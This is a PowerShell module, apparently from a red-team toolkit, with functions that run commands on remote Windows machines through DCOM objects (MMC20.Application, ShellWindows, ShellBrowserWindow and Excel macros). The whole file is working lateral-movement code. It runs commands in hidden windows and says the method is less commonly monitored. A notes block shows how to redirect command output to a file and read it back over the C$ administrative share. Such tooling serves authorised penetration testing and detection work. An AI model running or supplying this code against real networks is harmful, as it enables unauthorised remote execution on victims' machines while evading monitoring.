<#
.SYNOPSIS
    Execute commands on remote systems via DCOM

.DESCRIPTION
    Uses Distributed COM (DCOM) objects for remote command execution.
    Less commonly monitored than WMI or PSRemoting.

    Methods:
    - MMC20.Application (ExecuteShellCommand)
    - ShellWindows (ShellExecute)
    - ShellBrowserWindow (ShellExecute)

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER ComputerName
    Target computer name or IP

.PARAMETER Command
    Command to execute

.PARAMETER Method
    DCOM method to use (MMC20, ShellWindows, ShellBrowserWindow)

.EXAMPLE
    Invoke-DCOMExec -ComputerName TARGET-PC -Command "calc.exe"
    Invoke-DCOMExec -ComputerName TARGET-PC -Command "powershell.exe -Command Get-Process" -Method ShellWindows
#>

function Invoke-DCOMExec {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [Parameter(Mandatory)]
        [string]$Command,

        [ValidateSet('MMC20', 'ShellWindows', 'ShellBrowserWindow')]
        [string]$Method = 'MMC20',

        [string]$Arguments = "",

        [string]$WorkingDirectory = "C:\Windows\System32"
    )

    Write-Host @"

============================================================
  DCOM REMOTE EXECUTION
============================================================
  Target: $ComputerName
  Method: $Method
  Command: $Command $Arguments
============================================================

"@ -ForegroundColor Cyan

    # Parse command and arguments
    if (-not $Arguments -and $Command -match '(\S+)\s+(.+)') {
        $executable = $Matches[1]
        $Arguments = $Matches[2]
    }
    else {
        $executable = $Command
    }

    try {
        switch ($Method) {
            'MMC20' {
                Write-Host "[*] Using MMC20.Application method..." -ForegroundColor Yellow

                # MMC20.Application COM object
                $dcom = [System.Activator]::CreateInstance(
                    [type]::GetTypeFromProgID("MMC20.Application.1", $ComputerName)
                )

                # ExecuteShellCommand(command, directory, parameters, windowState)
                # windowState: "7" = hidden
                $dcom.Document.ActiveView.ExecuteShellCommand($executable, $null, $Arguments, "7")

                Write-Host "[+] Command executed via MMC20" -ForegroundColor Green
            }

            'ShellWindows' {
                Write-Host "[*] Using ShellWindows method..." -ForegroundColor Yellow

                # ShellWindows COM object CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39
                $dcom = [System.Activator]::CreateInstance(
                    [type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", $ComputerName)
                )

                # Get the first shell window
                $item = $dcom.Item()

                # ShellExecute(file, args, dir, operation, show)
                # show: 0 = hidden
                $item.Document.Application.ShellExecute($executable, $Arguments, $WorkingDirectory, $null, 0)

                Write-Host "[+] Command executed via ShellWindows" -ForegroundColor Green
            }

            'ShellBrowserWindow' {
                Write-Host "[*] Using ShellBrowserWindow method..." -ForegroundColor Yellow

                # ShellBrowserWindow COM object CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880
                $dcom = [System.Activator]::CreateInstance(
                    [type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", $ComputerName)
                )

                # ShellExecute
                $dcom.Document.Application.ShellExecute($executable, $Arguments, $WorkingDirectory, $null, 0)

                Write-Host "[+] Command executed via ShellBrowserWindow" -ForegroundColor Green
            }
        }

        Write-Host @"

[*] NOTES:
    - DCOM execution does not return output
    - Redirect output to file and retrieve via SMB:
      cmd.exe /c whoami > C:\temp\output.txt

    - Then retrieve:
      type \\$ComputerName\C$\temp\output.txt
"@ -ForegroundColor Yellow

        return $true
    }
    catch {
        Write-Error "DCOM execution failed: $_"
        return $false
    }
}

function Test-DCOMAccess {
    <#
    .SYNOPSIS
        Test DCOM accessibility on remote target

    .EXAMPLE
        Test-DCOMAccess -ComputerName TARGET-PC
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName
    )

    Write-Host "[*] Testing DCOM access to $ComputerName..." -ForegroundColor Yellow

    $methods = @(
        @{ Name = 'MMC20.Application'; ProgID = 'MMC20.Application.1'; Type = 'ProgID' }
        @{ Name = 'ShellWindows'; CLSID = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'; Type = 'CLSID' }
        @{ Name = 'ShellBrowserWindow'; CLSID = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'; Type = 'CLSID' }
    )

    $available = @()

    foreach ($method in $methods) {
        try {
            if ($method.Type -eq 'ProgID') {
                $dcom = [System.Activator]::CreateInstance(
                    [type]::GetTypeFromProgID($method.ProgID, $ComputerName)
                )
            }
            else {
                $dcom = [System.Activator]::CreateInstance(
                    [type]::GetTypeFromCLSID($method.CLSID, $ComputerName)
                )
            }

            Write-Host "[+] $($method.Name): Available" -ForegroundColor Green
            $available += $method.Name
        }
        catch {
            Write-Host "[-] $($method.Name): Not available" -ForegroundColor Red
        }
    }

    if ($available.Count -gt 0) {
        Write-Host "`n[*] Available methods: $($available -join ', ')" -ForegroundColor Cyan
    }
    else {
        Write-Host "`n[-] No DCOM methods available" -ForegroundColor Red
    }

    return $available
}

function Invoke-ExcelDCOM {
    <#
    .SYNOPSIS
        Execute command via Excel DCOM (requires Excel installed)

    .DESCRIPTION
        Uses Excel.Application DCOM object to execute commands via macros.
        Only works if Excel is installed on the target.

    .EXAMPLE
        Invoke-ExcelDCOM -ComputerName TARGET-PC -Command "calc.exe"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [Parameter(Mandatory)]
        [string]$Command
    )

    Write-Host "[*] Attempting Excel DCOM execution..." -ForegroundColor Yellow

    try {
        $excel = [System.Activator]::CreateInstance(
            [type]::GetTypeFromProgID("Excel.Application", $ComputerName)
        )

        $excel.DisplayAlerts = $false
        $workbook = $excel.Workbooks.Add()

        # Use DDEInitiate to execute command (older technique)
        # Or use Shell via VBA macro
        $macro = "Shell `"$Command`", vbHide"

        $excel.ExecuteExcel4Macro("EXEC(`"$Command`")")

        Write-Host "[+] Command sent via Excel DCOM" -ForegroundColor Green

        $excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
    }
    catch {
        Write-Error "Excel DCOM execution failed: $_"
    }
}

# Export functions
Export-ModuleMember -Function Invoke-DCOMExec, Test-DCOMAccess, Invoke-ExcelDCOM
